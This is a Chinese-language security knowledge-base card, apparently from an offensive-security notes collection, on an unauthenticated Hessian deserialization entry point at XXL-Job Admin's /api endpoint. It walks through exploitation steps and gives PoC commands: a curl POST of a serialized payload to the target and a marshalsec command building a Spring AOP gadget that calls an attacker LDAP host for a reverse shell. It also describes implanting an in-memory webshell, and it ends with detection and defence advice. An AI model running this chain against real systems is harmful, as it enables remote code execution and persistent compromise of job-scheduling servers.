---
id: web-java-deser-hessian-xxl-job-admin-api-entry
title: XXL-Job Admin /api 前台未授权 Hessian 反序列化入口
type: scenario
domain: web
path: web/java/deserialization/hessian
technique: hessian-entry-xxl-job-admin-api
aliases:
- XXL-Job /api 反序列化
- xxl-job-admin 前台 api 未授权
- JobApiController api Hessian
- xxl-job hessian 入口
tags:
- java
- hessian
- deserialization
- xxl-job
- spring-mvc
- unauthenticated
- entry-point
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V16
  verified_at: '2026-11-05T01:59:33+08:00'
  notes: 已对照原文与14张图片核对：图05异常栈确证请求已进入 Hessian2Input.readObject→SerializerFactory/MapDeserializer.readMap→HashMap.put→AbstractBeanFactoryPointcutAdvisor.getAdvice，仅因 adviceBeanName 被修补/不出网未打通；图06为 getAdvice 调 beanFactory.getBean；入口路径/Content-Type/PoC 与原文一致。与已 verified 的 JDK-only ProxyLazyValue 卡互补（本卡为 XXL-Job /api 入口）。原文未给受影响版本，未设 versions；PoC未本机执行；frontmatter无sources/source_url。
---

## 一句话结论

XXL-Job Admin 的 `/api` 回调接口把请求体直接交给 Hessian 反序列化，未授权即可投递任意 Hessian gadget 流并触发 RCE。

## 原理

- XXL-Job 的 admin 与 executor 通过 HTTP 互调；executor 回调 admin 时请求 `/api`，由 `com.xxl.job.admin.controller.JobApiController.api()` 读取请求体并进入 Hessian 反序列化。
- 该接口位于 admin 前台路径（如 `/xxl-job-admin/api`），默认没有登录态校验，攻击者可直接 POST 任意字节，并把 `Content-Type` 设为 `x-application/hessian` 让服务端按 Hessian 处理。
- 服务端调用链为 `Hessian2Input.readObject()` → `SerializerFactory.readMap()` → `MapDeserializer.readMap()` → `HashMap.put()` → gadget 的 `equals`/`hashCode`/`toString`。原文抓到的调用栈中可见 `java.util.HashMap.putVal` → `AbstractPointcutAdvisor.equals` → `AbstractBeanFactoryPointcutAdvisor.getAdvice`，说明反序列化已经执行到 gadget 方法。
- 危害来自 Hessian 反序列化本身：`SerializerFactory` 默认按流中类名 `Class.forName` 加载并实例化任意可反序列化类，没有允许列表；入口只是把不可信字节送进这条路径。

## 触发条件

- 目标暴露 XXL-Job Admin 的 `/api`（实际路径随 `server.servlet.context-path` 变化，常见为 `/xxl-job-admin/api`），且可从攻击者网络访问。
- 该接口未启用鉴权、来源 IP 白名单或网关访问控制。
- classpath 含 hessian（XXL-Job 自带），且未启用严格类允许列表。
- 目标 classpath 上存在可用 gadget 依赖（Spring、Groovy、Rome 等）或 JDK8 原生链可用。

## 利用步骤

1. 识别 XXL-Job：访问登录页 `/xxl-job-admin/toLogin`、静态资源与响应特征；对 `/api` 发送 `POST` 观察是否进入 Hessian 处理。
2. 用 DNSLog/URLDNS 或带延时 gadget 的 Hessian 流确认反序列化可达（注意 URLDNS 需目标能发起 DNS 查询）。
3. 按目标依赖和出网情况选择链：
   - 有 Spring AOP + 可出网：`AbstractBeanFactoryPointcutAdvisor` → `SimpleJndiBeanFactory.getBean` → JNDI；
   - 不出网或常见链被修补：JDK8 原生 `SwingLazyValue` → XSLT 落地链；
   - 有 Groovy/Rome 等依赖时换对应链。
4. 生成 Hessian 序列化字节（.ser），以 `Content-Type: x-application/hessian` POST 到 `/api`。
5. 用延时、DNS、回连或命令回显验证执行结果。

## PoC

入口确认（把 `test.ser` 换成任意 Hessian 序列化流）：

```bash
curl -i -XPOST \
  -H "Content-Type: x-application/hessian" \
  --data-binary @test.ser \
  http://target:8080/xxl-job-admin/api
```

原文用 marshalsec 生成 Spring AOP 链：

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar \
  marshalsec.Hessian2 SpringAbstractBeanFactoryPointcutAdvisor \
  ldap://attacker:1389/Deserialize/Jackson/ReverseShell/ip/port > test.ser
```

原文目标已修补该链的 `adviceBeanName` 且不出网，故这条 Spring JNDI 链未打通；换用 JDK8 原生 XSLT 链后成功（先用 sleep 延时验证，再注入 Listener 型内存马）。

## 变体与关联

- 出网且依赖齐全：Spring `AbstractBeanFactoryPointcutAdvisor`/`PartiallyComparableAdvisorHolder` → JNDI；Rome `ToStringBean`；Resin/XBean。
- 不出网：JDK8 `PKCS9Attributes.toString` → `UIDefaults.get` → `SwingLazyValue.createValue` → 静态方法 sink（见 JDK8 XSLT 落地链卡片）。
- 其他 Hessian 触发点：Groovy GString、ConcurrentHashMap、XString 等，均落到 `MapDeserializer.readMap` 的 `map.put`。
- 工具扫描只能覆盖常见链；目标打过补丁时需手动按调用栈换链。

## 检测与防御

- 不要将 XXL-Job Admin 暴露到公网；在网关/防火墙层限制 `/api` 仅允许执行器网段访问。
- 为 `/api` 增加鉴权（如校验执行器 `accessToken` 或独立的管理端认证），不要依赖前端隐藏路径。
- Hessian 侧启用类白名单（`SerializerFactory` 自定义），拒绝 `AbstractBeanFactoryPointcutAdvisor`、`UIDefaults`、`SwingLazyValue`、`Process` 等 gadget 类；仅黑名单不足以防御。
- 监控 POST `/api` 且 `Content-Type: x-application/hessian` 的请求、`Hessian2Input.readObject` 异常栈以及异常类加载。
- 升级 XXL-Job 到包含入口鉴权/安全修复的版本；移除不必要的 Spring AOP、Groovy、Rome 等 gadget 依赖。
